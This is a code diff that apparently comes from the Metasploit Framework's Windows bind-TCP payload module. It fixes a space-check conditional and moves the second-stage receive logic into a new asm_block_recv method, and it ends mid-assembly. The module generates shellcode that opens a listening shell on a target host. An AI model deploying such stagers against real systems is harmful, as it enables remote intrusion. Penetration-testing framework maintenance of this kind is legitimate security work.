@@ -34,7 +34,7 @@ module Payload::Windows::BindTcp
     }
 
     # Generate the more advanced stager if we have the space
-    unless self.available_space.nil? || required_space > self.available_space
+    if self.available_space && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC'],
       conf[:reliable] = true
     end
@@ -72,6 +72,7 @@ module Payload::Windows::BindTcp
       start:
         pop ebp
       #{asm_bind_tcp(opts)}
+      #{asm_block_recv(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
@@ -100,7 +101,7 @@ module Payload::Windows::BindTcp
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
@@ -192,7 +193,17 @@ module Payload::Windows::BindTcp
 
     asm << asm_send_uuid if include_send_uuid
 
-    asm << %Q^
+    asm
+  end
+
+  #
+  # Generate an assembly stub with the configured feature set and options.
+  #
+  # @option opts [Bool] :reliable Whether or not to enable error handling code
+  #
+  def asm_block_recv(opts={})
+    reliable     = opts[:reliable]
+    asm = %Q^
       recv:
         ; Receive the size of the incoming second stage...
         push 0                 ; flags
